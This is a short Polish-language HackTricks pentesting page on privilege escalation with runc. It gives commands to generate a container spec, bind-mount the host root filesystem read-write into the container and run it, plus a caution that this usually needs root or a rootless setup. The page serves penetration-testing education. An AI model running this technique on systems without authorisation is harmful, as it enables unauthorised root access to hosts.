# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

Jeśli chcesz dowiedzieć się więcej o **runc**, sprawdź następującą stronę:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Jeśli odkryjesz, że `runc` jest zainstalowany na hoście, możesz być w stanie **uruchomić kontener montując folder root / hosta**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> To nie zawsze zadziała, ponieważ domyślna operacja runc polega na uruchamianiu jako root, więc uruchomienie go jako użytkownik bez uprawnień po prostu nie może działać (chyba że masz konfigurację bezrootową). Ustawienie konfiguracji bezrootowej jako domyślnej nie jest zazwyczaj dobrym pomysłem, ponieważ istnieje wiele ograniczeń wewnątrz kontenerów bezrootowych, które nie mają zastosowania poza kontenerami bezrootowymi.

{{#include ../../banners/hacktricks-training.md}}
